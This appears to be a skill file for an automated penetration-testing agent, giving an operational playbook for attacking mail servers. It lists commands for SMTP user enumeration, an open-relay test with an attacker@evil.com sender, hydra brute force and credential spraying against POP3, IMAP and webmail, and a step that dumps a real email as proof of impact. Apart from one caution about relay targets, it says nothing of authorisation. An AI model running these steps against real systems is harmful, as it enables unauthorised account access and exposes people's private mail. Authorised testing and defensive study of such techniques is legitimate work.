---
name: svc-mail
tags: [recon, enumeration, exploitation]
description: Mail server attack techniques — SMTP open relay, VRFY/EXPN/RCPT user enumeration, header injection, IMAP/POP3 access. Use when a mail service is found. Triggers - SMTP 25/465/587, POP3 110, IMAP 143, Postfix/Exim/Sendmail/Dovecot banner, VRFY.
---

# Mail Server Attack Reference

## SMTP (25/465/587)
```bash
# Banner grab and commands
nc -nv <target> 25
nmap --script smtp-commands,smtp-enum-users,smtp-open-relay -p 25 <target>

# User enumeration via VRFY
telnet <target> 25
VRFY root
VRFY admin
VRFY <username>

# User enumeration via RCPT TO
EHLO test
MAIL FROM:<test@test.com>
RCPT TO:<admin@<domain>>    # 250 = exists, 550 = doesn't

# Automated user enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <target>
smtp-user-enum -M RCPT -U users.txt -D <domain> -t <target>
```

## Open Relay
```bash
# Test relay
telnet <target> 25
EHLO test
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>
DATA
Subject: Relay Test
Relay test body
.
QUIT

# Nmap check
nmap --script smtp-open-relay -p 25 <target>
```

## POP3 (110/995) & IMAP (143/993)
```bash
# Banner grab
nc -nv <target> 110
nc -nv <target> 143

# POP3 brute force
hydra -l <user> -P wordlist.txt pop3://<target>

# IMAP brute force
hydra -l <user> -P wordlist.txt imap://<target>

# If authenticated (POP3)
USER <username>
PASS <password>
LIST
RETR 1

# If authenticated (IMAP)
a1 LOGIN <user> <password>
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]
```

## Webmail
- OWA (Outlook Web Access): `/owa/`, `/ecp/` — brute force, spray
- Roundcube: check version for known CVEs
- SquirrelMail: `/squirrelmail/` — old versions have RCE

## Decide — Attack Order
1. User enumeration (VRFY/RCPT) → target list for cred_spray / webmail spray
2. Authenticated access → mailbox dump = fastest real proof
3. Open relay test (usually Low/Medium — note, move on)
4. Webmail surface → hand off to web skills (auth-bypass-idor, api-testing)

## Prove Impact
- Mailbox access: `RETR`/`FETCH` one REAL email, quote subject+sender (redact half). Folder listing ≠ impact.
- Open relay: capture the remote `250 Queued` acceptance — config heuristic without delivery proof stays `suspected`.
- Enumerated users feed `cred_spray` and OWA spraying — record them via `state_update`.

## Tooling
- `state_update`: user list, credentials, mailbox-content classification (never raw emails in state).
- `cred_spray`: SMTP/IMAP/OWA reuse checks — lockout-aware.
- `jwt_analyze` when webmail uses bearer tokens (modern OWA).

## Pitfalls
- VRFY disabled ≠ dead end: RCPT TO enumeration still works on default Postfix.
- Response codes differ per server (252 vs 250 vs 550) — calibrate with one known-good + one known-bad address first.
- Relay-test ONLY to a mailbox you control — never third parties.
- Same creds usually valid POP3+IMAP+SMTP-submission; prefer IMAP for folder structure.
